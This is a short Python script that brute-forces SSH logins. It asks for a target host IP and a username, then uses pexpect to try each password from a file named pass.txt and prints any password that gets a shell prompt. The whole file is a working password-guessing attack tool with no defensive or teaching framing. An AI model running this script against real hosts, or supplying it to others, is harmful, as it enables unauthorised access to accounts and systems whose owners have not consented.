#!/usr/local/bin/python3


import pexpect
from threading import *


prompt = ["# ", ">>> ", "> ", "\$ ", "~$ ", "\% "]


def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connecting"
    
    conn_str = "ssh "+user+"@"+host
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
    
    if ret == 0:
        print("[-] Error in connection")
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[p|P]assword: '])
        if ret == 0:
            print("[-] Error in connection")
            return
    child.sendline(password)
    child.expect(prompt)
    return child


def main():
    host = input("Enter Target Host IP Address: ")
    user = input("Enter Username of the IP: ")
    file = open("pass.txt", 'r')
    for password in file.readlines():
        password = password.strip("\n")
        try:
            child = connect(user, host, password)
            if not child == None:
                print("[+] password found: "+password)
        except:
            pass
        


if __name__=="__main__":
    main()
